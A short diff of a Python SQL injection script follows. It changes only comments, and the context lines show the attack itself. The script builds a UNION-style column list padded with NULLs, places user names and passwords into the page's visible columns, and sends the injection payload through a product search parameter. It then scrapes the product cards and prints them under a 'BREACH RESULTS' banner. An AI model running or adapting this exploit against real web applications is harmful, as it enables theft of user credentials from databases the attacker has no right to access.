@@ -105,8 +105,6 @@ if 'users' in tables:
     target_cols = ["NULL"] * detected_cols
     target_cols[0] = "id" 
     
-    # מיפוי אוטומטי:
-    # השם ילך לעמודה הגלויה הראשונה, הסיסמה לשנייה (אם קיימת)
     name_slot = visible_indices[0] if len(visible_indices) > 0 else 1
     pass_slot = visible_indices[1] if len(visible_indices) > 1 else name_slot
     
@@ -120,13 +118,11 @@ if 'users' in tables:
     res = requests.get(PRODUCTS_URL, params={'q': payload_users}, cookies=COOKIES)
     soup = BeautifulSoup(res.text, 'html.parser')
     
-    # חזרה לשיטה המקורית: חיפוש קודם כל את ה"קופסאות"
     cards = soup.find_all('article', class_='product-card')
     
     print("\n\033[1;41;37m[!!!] BREACH RESULTS:\033[0m")
     
     for card in cards:
-        # חיפוש פנימי בתוך כל קופסה
         name_div = card.find('div', class_='product-name')
         price_div = card.find('div', class_='product-price')
         
